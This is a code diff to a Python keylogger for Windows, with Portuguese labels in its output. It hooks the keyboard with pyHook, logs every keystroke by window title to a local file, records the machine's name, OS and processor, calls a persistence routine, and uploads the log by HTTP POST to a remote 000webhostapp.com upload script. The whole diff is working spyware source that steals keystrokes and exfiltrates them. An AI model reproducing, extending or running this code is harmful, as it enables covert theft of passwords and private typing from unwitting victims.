@@ -7,6 +7,8 @@ import os
 import subprocess
 import requests
 import threading
+import platform
+import time
 
 
 def onkey(event):
@@ -15,15 +17,15 @@ def onkey(event):
     global window
     global dump
 
-    file = open('C:\\captura\\captura2.txt', 'a')
+    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')
 
     if event.WindowName != window:
         window = event.WindowName
-        head = '\n' + window + ' - ' + str(event.Time) + '\n'
+        head = '\n\n[+] ' + window + ' - ' + date + '\n\n'
         file.write(head)
 
     if event.Ascii == 13:
-        data = '<ENTER>\n'
+        data = ' <ENTER>\n'
         file.write(data)
     elif event.Ascii == 8:
         data = ' <BACK SPACE> '
@@ -51,7 +53,7 @@ def upload(fileup):
     global urlFromUpload, urlFromUpShow
     if os.path.exists(fileup):
             files = {'file': open(fileup, 'rb')}
-            requests.post(urlFromUpload, files=files) #import requests
+            requests.post(urlFromUpload, files=files)  #import requests
 
 
 def persis():
@@ -63,21 +65,41 @@ def persis():
     except Exception as e:
         print e
 
+def main():
+    persis()
+
+    try:
+        os.mkdir('C:\\captura')
+    except:
+        pass
+
+    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')
+    file.write('\n[+]'+('-'*64+'[+]\n'))
+    file.write('   DATA E HORA: ' + date + '\n')
+    file.write('   NOME DO USUARIO: ' + pcname + '\n')
+    file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
+    file.write('   PROCESSADOR: ' + pcprocess + '\n')
+    file.write('[+]'+('-'*64 + '[+]\n'))
+    file.close()
+
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = onkey
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
 urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
 urlFromUpShow = urlFromUpload.strip('http:upload.php')
 window = None
 data = ''
 head = ''
 dump = []
-fileup = 'C:\\captura\\captura2.txt'
-persis()
+date = time.strftime("%d/%m/%Y")+ ' - ' + time.strftime("%X")
+pcname = platform.node()
+pcos = platform.platform()
+pcprocess = platform.processor()
+fileup = 'C:\\captura\\capt-'+pcname+'.txt'
 
-try:
-    os.mkdir('C:\\captura')
-except:
-    pass
-
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = onkey
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+if __name__ == "__main__":
+    main()
+ 
